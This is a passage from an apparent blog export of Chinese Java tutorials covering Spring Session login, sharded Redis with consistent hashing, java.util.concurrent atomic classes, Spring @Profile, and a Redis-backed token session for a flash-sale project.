5、controller方便进行测试123456789101112131415161718192021222324252627282930313233@Controller@RequestMapping("/user/springsession/")public class UserSpringSessionController &#123; @Autowired private UserService userService; @RequestMapping("login.do") @ResponseBody public ServerResponse&lt;User&gt; login(HttpSession session, String username, String password)&#123; ServerResponse response = userService.login(username,password); if(response.isSuccess())&#123; session.setAttribute(Const.CURRENT_USER,response.getData()); &#125; return response; &#125; @RequestMapping("logout.do") @ResponseBody public ServerResponse&lt;String&gt; logout(HttpSession session)&#123; session.removeAttribute(Const.CURRENT_USER); return ServerResponse.createBySuccess(); &#125; @RequestMapping("get_user_info.do") @ResponseBody public ServerResponse&lt;User&gt; get_user_info(HttpSession session)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorMessage("用户未登陆，无法获取当前用户信息"); &#125; return ServerResponse.createBySuccess(user); &#125;&#125; 6、注意 需要在applicationContext.xml中引入这个spring-session的配置文件 不要忘记User的POJO类要序列化一下 注意将spring的版本由一期的4.0.0升级到4.0.3,否则会存在Bug.]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[20、Redis分布式]]></title>
    <url>%2F2018%2F07%2F21%2F20%E3%80%81Redis%E5%88%86%E5%B8%83%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Redis分布式 1、引入原因 高并发快速读取海量数据，单个redis缓存不能满足要求。 怎么把缓存的Key均匀的映射到多台Redis服务器上，且随着缓存服务器的增加或减少时做到最小化的减少缓存Key的命中率呢？ 2、解决方案hash是什么？ hash即hash算法，又称为散列算法，百度百科的定义是 哈希算法将任意长度的二进制值映射为较短的固定长度的二进制值，这个小的二进制值称为哈希值。哈希值是一段数据唯一且极其紧凑的数值表示形式。 1.这句话有几个很重要的地方，首先是任意长度二进制，在java中，可以代表所有对象（序列化） 2.固定长度，使得hashmap等可以按照高低位进行位操作，同时能够提供统一的方式（有种协议的感觉） 3.数据唯一的数值，使得hashcode可以作为查找的依据（快速查找的根本） 为什么要hash? 个人观点：根据hash的定义，任意长的二进制值，都可以用一个很短的值来唯一地表示。那么对于比如对象的序列化值，我们只需要知道他的hash值是多少，就可以找到这个序列化的值，继而反序列化出对象。如果不用hash，那么查找很长的字符串的代价是巨大的。 csdn有这样一篇文章讲的很有意思，我们有一堆猪，怎么根据体重找到对应的一头。如果没有hash的思想，我们会比较每头猪，但是如果有1000头你也这样做么。引入hash，每头猪的重量hash到一个hashcode，hashcode会映射到对应的猪圈，我们只要比较每个猪圈的猪就行了，而最理想的情况就是每个猪圈的猪都一样多（注：每个猪圈一个是好，但是空间消耗巨大） 如何实现的？ java中的hash运算，一般同上。这里以redis集群个数为例，以对象的hashcode和redis数量的取模来实现对象和redis的映射。 这个方法就是100头猪（100个数据），编号是0-99，然后有3个猪圈（redis集群数量）的话，猪圈编号分别为0,1,2；0-99这100个头猪的编号与3进行取模运算，然后分配到对应的猪圈中。理想情况就是均匀地分配，基本数量都差不多。 带来的问题 这种redis集群的方式固然不错，并且根据取模，然后将数据存放在某台机器上。但是假如某台机器突然损坏，那么造成的结果就是某些数据缓存就跟着消失了，我们只有去访问数据库才行了，那么对于高并发的场景，不仅降低了速率，而且还对数据库造成很大的压力。 常规的解决方案就是rehash，桶的数量将会改变，所有的值将重新映射，最终数据会得到存储，这有两个问题，rehash的时刻，所有key将重新映射，这时，对于大并发的情形，是灾难的，所有请求将不经过任何缓存，服务器面临崩溃的风险，再者，老的数据依然还在，并且不会被用到，浪费存储空间。 解决redis节点增加或删除的问题 首先目标就是确保数据都可以映射到redis上，然后影响范围越小越好。 一致性hash：consistent hashing 是这样一种 hash 算法，简单的说，在移除 / 添加一个 节点（机器，ip）时，它能够尽可能小的改变已存在 key 映射关系。 hash环：任何的hash值都是固定长度的，因此可以通过一个回环来承载所有的hash值 一致性hash的原理 第一步就是把对象映射到对应的桶，而与通常的hash做法相比，一致性hash会比较特殊，一致性hash不会将key直接映射到桶，而将key和桶分别映射到回环的对应hash值节点 第二步，现在 cache 和对象都已经通过同一个 hash 算法映射到 hash数值空间中了，接下来要考虑的就是如何将对象映射到 cache 上面了。在这个环形空间中，如果沿着顺时针方向从对象的 key 值出发，直到遇见一个 cache ，那么就将该对象存储在这个 cache 上，因为对象和 cache 的 hash 值是固定的，因此这个 cache 必然是唯一和确定的。 那么，这样的话，就按照圆环的顺时针方向将所有的数据放进离他最近的桶中。如果增加了桶或者删除了桶，那么影响只是增加的那一小部分的数据，对于其他的区域都是不变的。 改进1234567考量 Hash 算法的另一个指标是平衡性 (Balance) ，定义如下：平衡性平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使得所有的缓冲空间都得到利用。hash 算法并不是保证绝对的平衡，如果 cache 较少的话，对象并不能被均匀的映射到 cache 上 虚拟节点 “虚拟节点”（ virtual node ）是实际节点在 hash 空间的复制品（ replica ），一实际个节点对应了若干个“虚拟节点”，这个对应个数也成为“复制个数”，“虚拟节点”在 hash 空间中以 hash 值排列。 大概的原理就是将实际节点进行复制，然后将这些虚拟节点比较均匀地分布于这个hash环，那么环上的数据就会依次放入虚拟节点中，使其比较均匀。最后，这些虚拟节点其实也都对应到实际节点上，此时，数据映射到实际节点时会比较地均匀。 参考：http://blog.csdn.net/u012191627/article/details/46815861 3、java代码实现引入依赖12345&lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;2.6.0&lt;/version&gt;&lt;/dependency&gt; redis连接池 将原来的JedisPool改为ShardedJedisPool。这里连接了两个redis，用jedisShardInfoList集合进行封装。 分布式redis主要用shardJedis实现，他是切片化的redis，支持redis分布式. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class RedisShardPool &#123; private static ShardedJedisPool pool;//jedis连接池 private static Integer maxTotal = Integer.parseInt(PropertiesUtil.getProperty("redis.max.total","20")); private static Integer maxIdle = Integer.parseInt(PropertiesUtil.getProperty("redis.max.idle","10")); private static Integer minIdle = Integer.parseInt(PropertiesUtil.getProperty("redis.min.idle","2")); private static Boolean testOnBorrow = Boolean.parseBoolean(PropertiesUtil.getProperty("redis.test.borrow","false")); private static Boolean testOnReturn = Boolean.parseBoolean(PropertiesUtil.getProperty("redis.test.return","true")); private static String redis1Ip = PropertiesUtil.getProperty("redis1.ip"); private static Integer redis1Port = Integer.parseInt(PropertiesUtil.getProperty("redis1.port")); private static String redis2Ip = PropertiesUtil.getProperty("redis2.ip"); private static Integer redis2Port = Integer.parseInt(PropertiesUtil.getProperty("redis2.port")); private static void initPool()&#123; JedisPoolConfig config = new JedisPoolConfig(); config.setMaxTotal(maxTotal); config.setMaxIdle(maxIdle); config.setMinIdle(minIdle); config.setTestOnBorrow(testOnBorrow); config.setTestOnReturn(testOnReturn); config.setBlockWhenExhausted(true); JedisShardInfo info1 = new JedisShardInfo(redis1Ip,redis1Port,1000*2); JedisShardInfo info2 = new JedisShardInfo(redis2Ip,redis2Port,1000*2); List&lt;JedisShardInfo&gt; jedisShardInfoList = Lists.newArrayList(); jedisShardInfoList.add(info1); jedisShardInfoList.add(info2); pool = new ShardedJedisPool(config,jedisShardInfoList, Hashing.MURMUR_HASH, Sharded.DEFAULT_KEY_TAG_PATTERN); &#125; static &#123; initPool(); &#125; public static ShardedJedis getJedis()&#123; return pool.getResource(); &#125; public static void returnResource(ShardedJedis jedis)&#123; pool.returnResource(jedis); &#125; public static void returnBrokenResource(ShardedJedis jedis)&#123; pool.returnBrokenResource(jedis); &#125; public static void main(String[] args) &#123; ShardedJedis jedis = pool.getResource(); jedis.set("jediskey","jedisvalue"); returnResource(jedis); System.out.println("program end"); &#125;&#125; 两个redis的配置参数123456#redis_ipredis1.ip=127.0.0.1redis2.ip=127.0.0.1#redis_portredis1.port=6379redis2.port=6380 redis接口123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110@Slf4jpublic class RedisShardPoolUtil &#123; /** * set(key,value) * @param key * @param value * @return */ public static String set(String key,String value)&#123; ShardedJedis jedis = null; String result = null; try &#123; jedis = RedisShardPool.getJedis(); result = jedis.set(key,value); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125;,value:&#123;&#125;",key,value,e); RedisShardPool.returnBrokenResource(jedis); return result; &#125; RedisShardPool.returnResource(jedis); return result; &#125; /** * get * @param key * @return */ public static String get(String key)&#123; ShardedJedis jedis = null; String result = null; try &#123; jedis = RedisShardPool.getJedis(); result = jedis.get(key); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125; error",key,e); RedisShardPool.returnBrokenResource(jedis); return result; &#125; RedisShardPool.returnResource(jedis); return result; &#125; /** * 用户信息放在redis session中，设置超时时间 * @param key * @param value * @param exTime 单位是秒 * @return */ public static String setEx(String key,String value,int exTime)&#123; ShardedJedis jedis = null; String result = null; try &#123; jedis = RedisShardPool.getJedis(); result = jedis.setex(key,exTime,value); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125;,value:&#123;&#125;",key,value,e); RedisShardPool.returnBrokenResource(jedis); return result; &#125; RedisShardPool.returnResource(jedis); return result; &#125; /** * 用户再次请求，重新设置超时时间 * @param key * @param exTime * @return */ public static Long expire(String key,int exTime)&#123; ShardedJedis jedis = null; Long result = null; try &#123; jedis = RedisShardPool.getJedis(); result = jedis.expire(key,exTime); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125;",key,e); RedisShardPool.returnBrokenResource(jedis); return result; &#125; RedisShardPool.returnResource(jedis); return result; &#125; public static Long del(String key)&#123; ShardedJedis jedis = null; Long result = null; try &#123; jedis = RedisShardPool.getJedis(); result = jedis.del(key); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125; error",key,e); RedisShardPool.returnBrokenResource(jedis); return result; &#125; RedisShardPool.returnResource(jedis); return result; &#125; public static void main(String[] args) &#123; ShardedJedis jedis = RedisShardPool.getJedis(); for(int i=0; i&lt;10; i++)&#123; RedisShardPoolUtil.set("shardkey"+i,"shardvalue"+i); &#125; System.out.println("end ..."); &#125;&#125; 最后，将之前所有进行单一redis的操作全部换位分布式redis的操作即可。 4、测试启动两个tomcat运行项目，启动两个redis进行数据缓存。执行上面一个util里面的main方法，发现，一部分数据存在了redis1中，一部分数据存在了redis2中。 https://zhuanlan.zhihu.com/p/34985026]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.线程安全性-Atomic包]]></title>
    <url>%2F2018%2F07%2F21%2F2.%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E6%80%A7-Atomic%E5%8C%85%2F</url>
    <content type="text"><![CDATA[Atomic包是我们经常使用的一个线程安全的包。 1. 线程安全性定义当多个线程访问某个类时，不管运行时环境采用何种调度方式或者这些进程将如何交替执行，并且在主调代码中不需要任何额外的同步或协同，这个类都能表现出正确的行为，那么就称这个类是线程安全的。 2. 线程安全三个特性 原子性 提供了互斥访问，同一时刻只能有一个线程来对它进行操作。 可见性 一个线程对主内存的修改可以及时地被其他线程观察到。 有序性 一个线程观察其他线程中的指令的执行顺序，由于指令重排序的存在，该观察结果一般杂乱无序。 3. AtomicInteger改造ConcurrencyTest类线程不安全这里用atomic原子类进行改造，主要是将原来的： public static int count = 0; 改为 public static AtomicInteger count = new AtomicInteger(); 下面原来的 count++; 改为： count.getAndIncrement(); 还有一个小地方，就是输出count的地方： 由count -&gt; count.get() 这样，执行结果就一直是5000了，就是说已经线程安全了。 那么到底发生了什么呢？ 点进incrementAndGet()这个方法，我们发现这个方法是unsafe这个类调用的： 123public final int getAndIncrement() &#123; return unsafe.getAndAddInt(this, valueOffset, 1);&#125; 再点进getAndAddInt这个方法： 123456789public final int getAndAddInt(Object var1, long var2, int var4) &#123; int var5; do &#123; //getIntVolatile是native方法 var5 = this.getIntVolatile(var1, var2); &#125; while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4));//compareAndSwapInt也是native方法 return var5; &#125; 这里的原理是什么呢？ 12345678910/** * 比较obj的offset处内存位置中的值和期望的值，如果相同则更新。此更新是不可中断的。 * * @param obj 需要更新的对象 * @param offset obj中整型field的偏移量 * @param expect 希望field中存在的值 * @param update 如果期望值expect与field的当前值相同，设置filed的值为这个新值 * @return 如果field的值被更改返回true */ public native boolean compareAndSwapInt(Object obj, long offset, int expect, int update); 根据Object obj和long offset拿到内存值，与期望值expect比较，两者相等，说明没有其他线程修改这个值，那么当前线程可以进行修改，将它更新为新值update；两者不相等，说明其他线程已经做了修改，那么当前线程继续下一次的循环尝试，重新读取新的期望值，再与内存值进行比较。 这样，就通过CAS操作，完成了线程安全的count计数功能。 4. LongAdder用LongAddr也可以，但是为什么不使用AtomicLong呢？换句话说，为什么AtomicLong可以实现，还要有LongAddr这个类呢？？？ 我们都知道AtomicLong是通过无限循环不停的采取CAS的方法从机器指令级别操作去设置value，直到成功为止。那么当并发数比较多或出现更新热点时，就会导致CAS的失败机率变高，重试次数更多，越多的线程重试，CAS失败的机率越高，形成恶性循环，从而降低了效率。而LongAdder的原理就是降低对value更新的并发数，也就是将对单一value的变更压力分散到多个value值上，降低单个value的“热度”.相较于AtomicLong来说，更加适合读多写少的并发情景。 在高并发下N多线程同时去操作一个变量会造成大量线程CAS失败，然后处于自旋状态，这样导致大大浪费CPU资源，降低了并发性。 既然AtomicLong性能问题是由于过多线程同时去竞争同一个变量的更新而降低的，那么如果把一个变量分解为多个变量，让同样多的线程去竞争多个资源，那么性能问题不久迎刃而解了吗？ LongAdder将把一个value拆分成若干cell，把所有cell加起来，就是value。所以对LongAdder进行加减操作，只需要对不同的cell来操作，不同的线程对不同的cell进行CAS操作，CAS的成功率当然高了. 可是在并发数不是很高的情况，拆分成若干的cell，还需要维护cell和求和，效率不如AtomicLong的实现。LongAdder用了巧妙的办法来解决了这个问题。 初始情况，LongAdder与AtomicLong是相同的，只有在CAS失败时，才会将value拆分成cell，每失败一次，都会增加cell的数量，这样在低并发时，同样高效，在高并发时，这种“自适应”的处理方式，达到一定cell数量后，CAS将不会失败，效率大大提高。 LongAdder是一种以空间换时间的策略。 LongAddr优点：我们从AtomicInteger这个类的实现看到，他是在一个死循环内不停地尝试修改目标值，直到修改成功。如果竞争不激烈的时候，修改成功的几率很高。否则修改失败的概率就会很高。在大量修改失败的时候，多次尝试，性能会受到一定的影响。 对于普通类型的Long和Double变量，JVM允许将64位的读操作和写操作拆成两个32位的操作。 （我们知道JUC下面提供的原子类都是基于Unsafe类实现的，并由Unsafe来提供CAS的能力。CAS (compare-and-swap)本质上是由现代CPU在硬件级实现的原子指令，允许进行无阻塞，多线程的数据操作同时兼顾了安全性以及效率。getAndAddLong方法会以volatile的语义去读需要自增的域的最新值，然后通过CAS去尝试更新，正常情况下会直接成功后返回，但是在高并发下可能会同时有很多线程同时尝试这个过程，也就是说线程A读到的最新值可能实际已经过期了，因此需要在while循环中不断的重试，造成很多不必要的开销。） 将AtomicLong核心数据value分离成一个数组，每个线程访问时，通过hash等算法，映射到其中一个数字进行计数。最终的计数结果则为这个数组的求和累加。其中热点数据value会被分离成多个单元的cell，每个cell独自维护内部的值，当前对象的实际值由cell累计合成。这样，热点就得到有效的分离并提高了并行度。 LongAddr在AtomicLong基础上将单点的更新压力分散到各个节点上。低并发时通过对base直接更新，得到与AtomicLong一样的性能。 缺陷：统计的时候，如果有并发更新，会有统计的误差，例如获取一个全局唯一的ID还是采用AtomicLong更好一点。 5. AtomicReference赋值操作不是线程安全的。若想不用锁来实现，可以用AtomicReference&lt;V&gt;这个类，实现对象引用的原子更新。 使用场景：一个线程使用student对象，另一个线程负责定时读表，更新这个对象。那么就可以用AtomicReference这个类。 AtomicReference是作用是对”对象”进行原子操作。 1234567891011121314public class atomicReferenceTest &#123; private static AtomicReference&lt;Integer&gt; count = new AtomicReference&lt;Integer&gt;(0); public static void main(String[] args) &#123; count.compareAndSet(0,2);//2 count.compareAndSet(0,1);//no count.compareAndSet(1,3);//no count.compareAndSet(2,4);//4 count.compareAndSet(3,5);//no System.out.println(count.get());//4 &#125;&#125; 基本原理： AtomicReference的源码比较简单。它是通过volatile和Unsafe提供的CAS函数实现原子操作。 (01) value是volatile类型。这保证了：当某线程修改value的值时，其他线程看到的value值都是最新的value值，即修改之后的volatile的值。(02) 通过CAS设置value。这保证了：当某线程池通过CAS函数(如compareAndSet函数)设置value时，它的操作是原子的，即线程在操作value时不会被中断。 6. AtomicIntegerFieldUpdater1234567891011121314151617181920212223242526272829303132import com.njupt.swg.threadstudyjimin.annotation.ThreadSafe;import lombok.extern.slf4j.Slf4j;import java.util.concurrent.atomic.AtomicIntegerFieldUpdater;@Slf4j@ThreadSafepublic class AtomicIntegerFieldUpdaterTest &#123; //表示更新AtomicIntegerFieldUpdaterTest这个类的count字段 private static AtomicIntegerFieldUpdater&lt;AtomicIntegerFieldUpdaterTest&gt; updater = AtomicIntegerFieldUpdater.newUpdater(AtomicIntegerFieldUpdaterTest.class,"count"); //不能是static,必须是volatile public volatile int count = 100; public int getCount()&#123; return count; &#125; public static void main(String[] args) &#123; AtomicIntegerFieldUpdaterTest example = new AtomicIntegerFieldUpdaterTest(); if(updater.compareAndSet(example,100,200))&#123; log.info("update success 1:&#123;&#125;",example.getCount()); &#125; if(updater.compareAndSet(example,100,200))&#123; log.info("update success 2:&#123;&#125;",example.getCount()); &#125;else &#123; log.error("update fail"); &#125; &#125;&#125; 运行结果： 12update success 1:200update fail 7. AtomicStampedReference解决ABA问题：其他线程将A改为B，又重新改为了A，本线程用期望值A与之进行比较，发现是相等的，则进行下面的操作。因为这个值已经被改变过，这就是ABA问题。 解决：用个版本号来控制，来防止ABA问题。 8. AtomicBoolean场景：若干个线程进来，但是这个方法只能执行一次。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@ThreadSafe@Slf4jpublic class AtomicBooleanTest &#123; /**************************************************************/ //AtomicBoolean初始化为false private static AtomicBoolean atomicBoolean = new AtomicBoolean(); /**************************************************************/ private static int clientTotal = 5000; private static int threadTotal = 200; public static void main(String[] args) throws InterruptedException &#123; ExecutorService threadPool = Executors.newCachedThreadPool(); Semaphore semaphore = new Semaphore(threadTotal); CountDownLatch countDownLatch = new CountDownLatch(clientTotal); System.out.println(atomicBoolean.get()); for(int i=0;i&lt;clientTotal;i++)&#123; threadPool.execute(() -&gt; &#123; try&#123; semaphore.acquire(); test(); semaphore.release(); &#125;catch (Exception e)&#123; log.error("semaphore exception"); &#125; &#125;); countDownLatch.countDown(); &#125; countDownLatch.await(); threadPool.shutdown(); System.out.println("执行结果为："+atomicBoolean.get()); &#125; /**************************************************************/ //第一个进来变成true之后，后面所有的都不能再进这个if了 //这里有5000个线程，只执行一次这个代码的场景 private static void test()&#123; if(atomicBoolean.compareAndSet(false,true))&#123; System.out.println("执行了compareAndSet方法..."); &#125; &#125; /**************************************************************/&#125;]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[20.@Profile环境搭建和根据环境注册bean]]></title>
    <url>%2F2018%2F07%2F21%2F20.%40Profile%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E6%A0%B9%E6%8D%AE%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%86%8Cbean%2F</url>
    <content type="text"><![CDATA[学习属性赋值和自动装配. spring为我们提供的可用根据当前环境，动态地激活和切换一系列组件的功能。 开发环境、测试环境、生产环境，可能用不同的数据源，那么不想改动很多代码的话，就可以用@Profile切换。 @Profile：指定组件在哪个环境的情况下才能被注册到容器中，不指定，在任何环境下都能注册这个组件。 加了@Profile的@Bean，只有这个环境被激活的时候才能注册到容器中，但是有一个默认注册的：@Profile(&quot;default&quot;) 那么如何指定某个环境注册到spring容器中呢？ 第一种方式：使用命令行动态参数 VM arguments: -Dspring.profiles.active=test 第二种方式：代码 1234567//1,创建一个applicationContext//2,设置需要激活的环境applicationContext.getEnvironment().setActiveProfiles("test","dev");//3,注册配置类applicationContext.register(MainConfigOfProfile.class);//4,启动刷新容器applicationContext.refresh(); 总结 @Value赋值 @PropertySource加载外部配置文件 @Autowired &amp; @Qualifier &amp; @Primary &amp; @Resource &amp; @Inject以及@Autowired在方法、构造器、参数位置的自动装配 通过实现Aware接口可以注入Spring底层的一些组件 @Profile环境搭建和根据环境注册bean]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.整合redis]]></title>
    <url>%2F2018%2F07%2F21%2F2.%E6%95%B4%E5%90%88redis%2F</url>
    <content type="text"><![CDATA[整合redis实现分布式session存储 目标：整合redis实现分布式session存储 1. 添加依赖123456789101112&lt;!--fastJson--&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.38&lt;/version&gt;&lt;/dependency&gt;&lt;!--redis--&gt;&lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt;&lt;/dependency&gt; 2. yml配置文件123456redis: host: 127.0.0.1 port: 6379 max-idle: 5 max-total: 10 max-wait-millis: 3000 3. 读取这些配置12345678910111213141516@Component@Datapublic class RedisConfig &#123; /*****redis config start*******/ @Value("$&#123;redis.host&#125;") private String redisHost; @Value("$&#123;redis.port&#125;") private int redisPort; @Value("$&#123;redis.max-idle&#125;") private int redisMaxTotal; @Value("$&#123;redis.max-total&#125;") private int redisMaxIdle; @Value("$&#123;redis.max-wait-millis&#125;") private int redisMaxWaitMillis; /*****redis config end*******/&#125; 4. RedisPoolFactory构建redisPool1234567891011121314151617@Servicepublic class RedisPoolFactory &#123; @Autowired RedisConfig redisConfig; @Bean public JedisPool JedisPoolFactory() &#123; JedisPoolConfig poolConfig = new JedisPoolConfig(); poolConfig.setMaxIdle(redisConfig.getRedisMaxIdle()); poolConfig.setMaxTotal(redisConfig.getRedisMaxTotal()); poolConfig.setMaxWaitMillis(redisConfig.getRedisMaxWaitMillis()); JedisPool jp = new JedisPool(poolConfig, redisConfig.getRedisHost(), redisConfig.getRedisPort()); return jp; &#125; &#125; 5. 在用redisPool进行操作之前，先解决一下key的生成问题接口（定义契约）—-抽象类（通用方法）—-实现类（具体实现） 接口：接口定义两个方法声明，一个是获取key的前缀，一个是过期时间 1234567public interface KeyPrefix &#123; public int expireSeconds(); public String getPrefix(); &#125; 抽象类： 12345678910111213141516171819202122232425public abstract class BasePrefix implements KeyPrefix&#123; private int expireSeconds; private String prefix; public BasePrefix(String prefix) &#123;//0代表永不过期 this(0, prefix); &#125; public BasePrefix( int expireSeconds, String prefix) &#123; this.expireSeconds = expireSeconds; this.prefix = prefix; &#125; public int expireSeconds() &#123;//默认0代表永不过期 return expireSeconds; &#125; public String getPrefix() &#123; String className = getClass().getSimpleName(); return className+":" + prefix; &#125;&#125; 具体的实现类，这里先以MiaoshaUserKey为例： 12345678public class MiaoshaUserKey extends BasePrefix&#123; public static final int TOKEN_EXPIRE = 3600*24 * 2; private MiaoshaUserKey(int expireSeconds, String prefix) &#123; super(expireSeconds, prefix); &#125; public static MiaoshaUserKey token = new MiaoshaUserKey(TOKEN_EXPIRE, "tk");&#125; 那么构造出来的prefix显然是MiaoshaUserKey:tk，超时时间也被传递进expireSeconds。 下面我们执行： 12String token = UUIDUtil.uuid();redisService.set(MiaoshaUserKey.token,token,user); 那么就相当于： 1redisService.set("MiaoshaUserKey:tk",UUID,user对象); 那么，redis 的set方法具体是： 123456789101112131415161718192021public &lt;T&gt; boolean set(KeyPrefix prefix, String key, T value) &#123; Jedis jedis = null; try &#123; jedis = jedisPool.getResource(); String str = beanToString(value);//序列化成字符串 if(str == null || str.length() &lt;= 0) &#123; return false; &#125; //生成真正的key String realKey = prefix.getPrefix() + key;//MiaoshaUserKey:tkUUID int seconds = prefix.expireSeconds();//超时时间 if(seconds &lt;= 0) &#123; jedis.set(realKey, str); &#125;else &#123; jedis.setex(realKey, seconds, str);//set进redis中 &#125; return true; &#125;finally &#123; returnToPool(jedis); &#125;&#125; 再下一步是将UUID写到cookie中： 1CookieUtil.writeLoginToken(response,token); 写入cookie： 1234567891011public final static String COOKIE_NAME = "login_token";public static void writeLoginToken(HttpServletResponse response, String token)&#123; Cookie ck = new Cookie(COOKIE_NAME,token); //ck.setDomain(COOKIE_DOMAIN); ck.setPath("/");//设值在根目录 ck.setHttpOnly(true);//不允许通过脚本访问cookie,避免脚本攻击 ck.setMaxAge(MiaoshaUserKey.token.expireSeconds()); log.info("write cookieName:&#123;&#125;,cookieValue:&#123;&#125;",ck.getName(),ck.getValue()); response.addCookie(ck);&#125; 这样，下面继续访问的时候，先根据cookie拿到UUID，再根据UUID从redis 中拿到User对象。 以浏览商品列表为例： 123456789101112@RequestMapping("to_list")public String toList(@CookieValue(value= CookieUtil.COOKIE_NAME,required = false) String cookieToken, @RequestParam(value = CookieUtil.COOKIE_NAME,required = false) String paramToken, Model model,HttpServletResponse response)&#123; if(StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(paramToken))&#123; return "login"; &#125; String token = StringUtils.isEmpty(paramToken)?cookieToken:paramToken; MiaoshaUser user = userService.getByToken(token,response); model.addAttribute("user",user); return "goods_list";&#125; 他是根据前面传来的token做下面的操作，当然还可以从后端读前面的cookie，取出相应的值。 其中： 1MiaoshaUser user = userService.getByToken(token,response); 的具体实现是： 1234567891011121314public MiaoshaUser getByToken(String token,HttpServletResponse response) &#123; //先判断token是否为空 if(StringUtils.isEmpty(token))&#123; return null; &#125; //根据token到redis中拿到相应的value MiaoshaUser user = redisService.get(MiaoshaUserKey.token,token,MiaoshaUser.class); redisService.set(MiaoshaUserKey.token,token,user);//key---&gt;UserKey:tkUUID,value---&gt;Serialized User //如果此时拿到user成功了，这里要重新设置一下redis过期时间 if(user != null)&#123; redisService.set(MiaoshaUserKey.token,token,user); &#125; return user;&#125; 注意：这里重新设置redis过期时间方式，在这里页面比较少的情况下，临时这样，但是在页面比较多的情况下，显然是不合适的，可以用一个过滤器，拦截所有的请求，然后在这个过滤器里进行登录过期时间的刷新。 6. 修改代码我们发现，后面涉及到商品等其他的接口，按照这种写法，每次都要先获取cookie，然后从redis中获取user信息，获取成功，我们才能进行下一步操作。显然太过冗余，我们可以将其剥离出来，写在一个地方，避免冗余的代码。 我们的controller可以写成： 12345@RequestMapping("to_list")public String toList(Model model,HttpServletResponse response,MiaoshaUser user)&#123; model.addAttribute("user",user); return "goods_list";&#125; 那么，我们在一个地方统一判断user是否能获取到。就要用到springmvc的机制了，我们可以试想springmvc支持的参数都是如何进来的呢？比如这里的MiaoShaUser是从什么地方注入进来的呢？ 其实在UserArgumentResolver这个类中就可以拿到输入的参数，比如MiaoShaUser这个对象，然后再在resolveArgument这个方法里，对这个参数进行相应的处理： 1234567891011121314151617181920212223@Servicepublic class UserArgumentResolver implements HandlerMethodArgumentResolver&#123; @Autowired private MiaoshaUserService userService; @Override public boolean supportsParameter(MethodParameter parameter) &#123; Class&lt;?&gt; clazz = parameter.getParameterType(); return clazz== MiaoshaUser.class; &#125; @Override public Object resolveArgument(MethodParameter methodParameter, ModelAndViewContainer modelAndViewContainer, NativeWebRequest webRequest, WebDataBinderFactory webDataBinderFactory) throws Exception &#123; HttpServletRequest request = webRequest.getNativeRequest(HttpServletRequest.class); HttpServletResponse response = webRequest.getNativeResponse(HttpServletResponse.class); String paramToken = request.getParameter(CookieUtil.COOKIE_NAME); String cookieToken = CookieUtil.readLoginToken(request); if(StringUtils.isEmpty(cookieToken) &amp;&amp; StringUtils.isEmpty(paramToken))&#123; return "login"; &#125; String token = StringUtils.isEmpty(paramToken)?cookieToken:paramToken; return userService.getByToken(token,response); &#125;&#125; 当然，这个对传入的参数进行修改的UserArgumentResolver要被重新加入进argumentResolvers中，相当于完成对原始的argumentResolvers中某个参数的重写： 12345678910@Configurationpublic class WebConfig extends WebMvcConfigurerAdapter&#123; @Autowired private UserArgumentResolver userArgumentResolver; @Override public void addArgumentResolvers(List&lt;HandlerMethodArgumentResolver&gt; argumentResolvers) &#123; argumentResolvers.add(userArgumentResolver); &#125;&#125; 这样，只要某个方法中传入了MiaoShaUser这个对象，那么就会进入resolveArgument()这个方法进行判断是否能拿到这个对象。]]></content>
      <tags>
        <tag>秒杀系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.商品和类目开发]]></title>
    <url>%2F2018%2F07%2F21%2F2.%E5%95%86%E5%93%81%E5%92%8C%E7%B1%BB%E7%9B%AE%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 商品service暂时先写几个通用的方法：123456789101112public interface ProductService &#123; /*根据商品的id获取商品信息*/ ProductInfo findProductById(String productId); /*获取所有商家商品*/ List&lt;ProductInfo&gt; findAllUpProducts(); /*查询所有商品(分页)*/ Page&lt;ProductInfo&gt; findAll(Pageable pageable); //加库存 //TODO //减库存 //TODO&#125; 这里只说一说分页方法。 对它的测试是： 123456@Testpublic void findAll() throws Exception &#123; PageRequest request = new PageRequest(0,10); Page&lt;ProductInfo&gt; productInfoList = productService.findAll(request); assertEquals(3,productInfoList.getTotalElements());&#125; 商品列表1、根据前端的api文档可知，前端要显示类目及下面的商品，需要请求的路径是： 12//商品列表GET /sell/buyer/product/list 前端没有需要传过来的参数，我们后端需要向前端反馈的数据格式是： 1234567891011121314151617181920212223242526272829303132&#123; "code": 0, "msg": "成功", "data": [ &#123; "name": "热榜", "type": 1, "foods": [ &#123; "id": "123456", "name": "皮蛋粥", "price": 1.2, "description": "好吃的皮蛋粥", "icon": 